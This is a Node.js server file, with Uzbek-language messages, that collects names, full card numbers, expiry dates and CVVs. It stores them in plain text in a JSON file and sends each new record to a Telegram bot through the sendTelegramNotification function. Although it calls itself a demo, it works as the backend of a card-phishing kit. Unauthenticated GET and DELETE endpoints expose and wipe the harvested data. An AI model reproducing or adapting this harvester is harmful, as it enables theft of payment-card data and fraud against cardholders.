const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const ROOT = __dirname;
const DATA_FILE = path.join(ROOT, 'data', 'entries.json');

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.txt': 'text/plain; charset=utf-8',
};

function ensureDataFile() {
  const dir = path.dirname(DATA_FILE);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }

  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, '[]', 'utf8');
  }
}

function readEntries() {
  ensureDataFile();

  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (error) {
    return [];
  }
}

function writeEntries(entries) {
  ensureDataFile();
  fs.writeFileSync(DATA_FILE, JSON.stringify(entries, null, 2), 'utf8');
}

function normalizeCard(value) {
  return String(value || '').replace(/\D/g, '').slice(0, 16);
}

function normalizeExpiry(value) {
  const digits = String(value || '').replace(/\D/g, '').slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function normalizeCvv(value) {
  return String(value || '').replace(/\D/g, '').slice(0, 4);
}

function normalizeEntry(entry) {
  if (!entry || typeof entry !== 'object') {
    throw new Error('Ma\'lumotlar to\'g\'ri kelmadi.');
  }

  const name = String(entry.name || '').trim();
  const card = normalizeCard(entry.card);
  const expiry = normalizeExpiry(entry.expiry);
  const cvv = normalizeCvv(entry.cvv);

  if (!name) {
    throw new Error('Ism kiritilishi shart.');
  }

  if (!/^[0-9]{16}$/.test(card)) {
    throw new Error('Karta raqami 16 ta raqamdan iborat bo\'lishi kerak.');
  }

  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
    throw new Error('Karta muddati noto\'g\'ri kiritildi.');
  }

  if (!/^\d{3,4}$/.test(cvv)) {
    throw new Error('CVV 3 yoki 4 raqamdan iborat bo\'lishi kerak.');
  }

  return { name, card, expiry, cvv };
}

function getEntries() {
  return readEntries().map((item) => {
    if (typeof item === 'string') {
      return { name: item, card: '0000 0000 0000 0000', expiry: '12/28', cvv: '123' };
    }

    return {
      name: item.name || "Noma'lum",
      card: item.card || '0000 0000 0000 0000',
      expiry: item.expiry || '12/28',
      cvv: item.cvv || '123',
    };
  });
}

function addEntry(entry) {
  const normalized = normalizeEntry(entry);
  const entries = getEntries();
  const exists = entries.some(
    (item) =>
      item.name === normalized.name &&
      item.card === normalized.card &&
      item.expiry === normalized.expiry &&
      item.cvv === normalized.cvv
  );

  if (!exists) {
    entries.push(normalized);
    writeEntries(entries);
    if (typeof globalThis.fetch === 'function') {
      sendTelegramNotification(normalized).catch(() => undefined);
    }
  }

  return normalized;
}

function clearEntries() {
  writeEntries([]);
}

function formatCardForMessage(card) {
  const digits = String(card || '').replace(/\D/g, '').slice(0, 16);
  if (digits.length === 0) return 'N/A';

  const groups = [];
  for (let i = 0; i < digits.length; i += 4) {
    groups.push(digits.slice(i, i + 4));
  }

  return groups.join(' ');
}

async function sendTelegramNotification(entry) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return false;
  }

  const cardText = formatCardForMessage(entry?.card);
  const message = [
    'Yangi ma\'lumot keldi:',
    `Ism: ${entry?.name || 'Noma\'lum'}`,
    `Karta: ${cardText}`,
    `Muddati: ${entry?.expiry || 'N/A'}`,
    `CVV: ${entry?.cvv || 'N/A'}`,
    `Sana: ${new Date().toLocaleString('uz-UZ')}`,
  ].join('\n');

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: String(chatId),
        text: message,
        disable_web_page_preview: true,
      }),
    });

    if (!response || !response.ok) {
      const payload = response && typeof response.json === 'function' ? await response.json().catch(() => ({})) : {};
      console.error('Telegram notification failed:', payload.description || payload.error || 'Unknown error');
      return false;
    }

    return true;
  } catch (error) {
    console.error('Telegram notification failed:', error.message || error);
    return false;
  }
}

function sendJson(res, statusCode, payload) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
  });
  res.end(JSON.stringify(payload));
}

function readRequestBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk.toString();
    });

    req.on('end', () => {
      if (!body) {
        resolve({});
        return;
      }

      try {
        resolve(JSON.parse(body));
      } catch (error) {
        reject(new Error('Noto\'g\'ri JSON format.'));
      }
    });

    req.on('error', () => {
      reject(new Error('So\'rovni o\'qib bo\'lmadi.'));
    });
  });
}

function serveStatic(req, res, requestPath) {
  const safePath = requestPath === '/' ? '/index.html' : requestPath;
  const filePath = path.normalize(safePath).replace(/^\.+/, '');
  const target = path.join(ROOT, filePath);

  if (!target.startsWith(ROOT)) {
    res.writeHead(403);
    res.end('Forbidden');
    return;
  }

  const requestedFile = fs.existsSync(target) && fs.statSync(target).isDirectory()
    ? path.join(target, 'index.html')
    : target;

  if (!fs.existsSync(requestedFile)) {
    res.writeHead(404);
    res.end('Not found');
    return;
  }

  const extension = path.extname(requestedFile).toLowerCase();
  const contentType = MIME_TYPES[extension] || 'application/octet-stream';
  const content = fs.readFileSync(requestedFile);

  res.writeHead(200, { 'Content-Type': contentType });
  res.end(content);
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost');

  if (req.method === 'GET' && url.pathname === '/api/entries') {
    sendJson(res, 200, getEntries());
    return;
  }

  if (req.method === 'POST' && url.pathname === '/api/entries') {
    try {
      const body = await readRequestBody(req);
      const entry = addEntry(body);
      sendJson(res, 201, { success: true, entry });
    } catch (error) {
      sendJson(res, 400, { success: false, message: error.message });
    }
    return;
  }

  if (req.method === 'DELETE' && url.pathname === '/api/entries') {
    clearEntries();
    sendJson(res, 200, { success: true });
    return;
  }

  if (req.method === 'GET' && url.pathname === '/admin') {
    serveStatic(req, res, '/admin/index.html');
    return;
  }

  if (req.method === 'GET' || req.method === 'HEAD') {
    const requestPath = url.pathname === '/admin/' ? '/admin/index.html' : url.pathname;
    serveStatic(req, res, requestPath);
    return;
  }

  res.writeHead(405, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(JSON.stringify({ success: false, message: 'Method not allowed.' }));
});

if (require.main === module) {
  server.listen(PORT, () => {
    console.log(`Demo server started at http://localhost:${PORT}`);
  });
}

module.exports = {
  getEntries,
  addEntry,
  clearEntries,
  normalizeEntry,
  sendTelegramNotification,
};
